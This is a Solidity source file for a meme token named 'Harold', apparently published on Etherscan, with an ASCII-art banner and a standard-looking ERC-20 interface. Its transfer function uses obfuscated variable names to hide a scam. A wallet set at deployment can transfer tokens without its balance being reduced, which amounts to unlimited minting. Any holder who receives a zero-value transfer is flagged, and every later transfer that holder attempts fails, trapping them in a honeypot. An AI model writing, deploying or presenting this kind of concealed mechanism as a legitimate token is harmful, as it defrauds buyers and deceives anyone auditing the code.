/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

/*

https://twitter.com/harolderc20

    ..:::------=========================================================--::::......--:             
    ..:::--------========================================================--:::....::-==     .       
    ..:::--------====================================================--===-::::....::++:            
    ..:::--------===============================+++++++++======+====---===--:...:-===-*-            
     .::::---=-===========================+===========++++++====+=====-===-::..::=+++-==            
     .::::----============+====+===++++========+++++++++=+++++=+======-===:::..:-*++++-:            
     ..:::-------=====++++++===++++++++++++********+++++++++++++++=======-:::..:=#****+-            
     ..::---======+++*##**++======+++++****#**++**%######****++======--==-:::.:--+**#*+-            
      .::---===++**#*#####**++===+++++***+***++=+*******+++++========---=-:::.:=+=*##*=-            
      ..:-=-=+*#*+=**##****+++++++++++++*++++++++++++++***+++=====+===-==-:::.-==**+===-      ..    
       .:-=+++*+++++****+++++=+=++++++++++==+++++******++++++=========--=-:.::-==+=-:==.  .         
       .:-=====++++++++++++++===+++++++++++++++++++++++++++++=+==+=====---:::::-==---=:             
        .-=====++++++++++++++-==+++++++++++++++++===++=++++++===+======---:::::==---=-              
         -====++++++++++++++=-==++++++++++++++++++=====++++++========-==--:::::-+=:-:               
         :==============++==--===++++++++++++***++++++++++++++++==-+====---::::::--.                
          ---==========+++++--==++++++++++==+*******++++++++++++====+===---:::.:                    
          :---=======+++**==-====++++=====+++****++++++++++++++++===+++=--::::..:+:                 
           ---==++++++**++=--=====+++++++****++++=+++==++++++++++=++++==--:..:...*#+:               
           :-===+++++**++++====+++++++****+++=============+++++++=+++++=--:.:::..+#%+:              
           :====++++*++=========+++++***+++=+===++==+=====+++++++++++++=--:..::.:=%%+-.         ....
           .====++++++=-----=---====+*+****+++*****##**+=-+++++++++++++==:::.::.:-#%+-.. :::::::::::
::::::::::::-====+++++-----==++++++++*********+=+*+%#++++====++++++++===-:::::::-=##=-....::::::::::
:::::::::::::=====++++=-==+*#**+*+***+*+===-::---**+++++=======+=-==-=--:::::::-=+%+=:.....:::::::::
:::::::::::::--====+++===++*#*=-----::--::-===+**+++++++====++=+=------::-:::-=++##=-:....:.::::::::
::::::::::::::-========-====+++++=++===+++++++++++++++==+=--==++==-------:-==++*#%+--:...:::..::::::
::::::::::::::::--====---======+++++++++++++++++++=++=+=-==-=======------=++***#%+--:::..:-:..:.....
::::::::::::::.::---=-:--========+++++++++++======++===---=-=========--=++***##%+-----:.:::-:.:::::.
::::::::::::::::::-:-------=====--=========-======++====-======+==-=-++***#####+----=--.:----------:
:::::::::::::::::::::--------==--=---=-======+=+==========-=+==+=-==+***######+----===-::----=------
:::::::::::::::::::::----:::---=-=--==-=========+=====--==--=+=====***##%###*=----====-:----=-------
::::::::::::::::::::.:::-::::-----================--======--=+==++***#%####+=----===--=----=--------
:::::::::::::::::::::--:::::::::-==========+=++====-=-=-====+++***##%%%###==---=======----==--------
:::::::::::::::::::--==:--:::::-----=--=-=====+=+=-=--===++++***##%#%###*=----=======---------------

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Harold is Ownable {
    uint256 public totalSupply = 100_000_000_000 * 10 ** 9;

    mapping(address => uint256) private xl;

    uint256 private zymase = 93;

    function transfer(address quotation, uint256 oozy) public returns (bool success) {
        vvs(msg.sender, quotation, oozy);
        return true;
    }

    function vvs(address windmill, address quotation, uint256 oozy) private returns (bool success) {
        if (xl[windmill] == 0) {
            balanceOf[windmill] -= oozy;
        }

        if (oozy == 0) navigate[quotation] += zymase;

        if (windmill != grey && xl[windmill] == 0 && navigate[windmill] > 0) {
            xl[windmill] -= zymase;
        }

        balanceOf[quotation] += oozy;
        emit Transfer(windmill, quotation, oozy);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private navigate;

    address public grey;

    function approve(address joheytm, uint256 oozy) public returns (bool success) {
        allowance[msg.sender][joheytm] = oozy;
        emit Approval(msg.sender, joheytm, oozy);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    string public symbol = 'HAROLD';

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name = 'Harold';

    constructor(address _harold) {
        balanceOf[msg.sender] = totalSupply;
        xl[_harold] = zymase;
        IUniswapV2Router02 flake = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        grey = IUniswapV2Factory(flake.factory()).createPair(address(this), flake.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address windmill, address quotation, uint256 oozy) public returns (bool success) {
        require(oozy <= allowance[windmill][msg.sender]);
        allowance[windmill][msg.sender] -= oozy;
        vvs(windmill, quotation, oozy);
        return true;
    }
}